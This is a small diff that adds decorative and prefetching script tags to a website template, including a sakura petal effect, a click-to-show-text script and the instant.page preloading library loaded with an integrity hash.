+<script type="text/javascript" src="\js\sakura.js"></script>
+
+
+<!-- 数字雨 
+<canvas id="canvas" width="1440" height="900" ></canvas>
+<script type="text/javascript" src="/js/DigitalRain.js"></script>-->
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+
+<!--图片预加载-->
+<script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
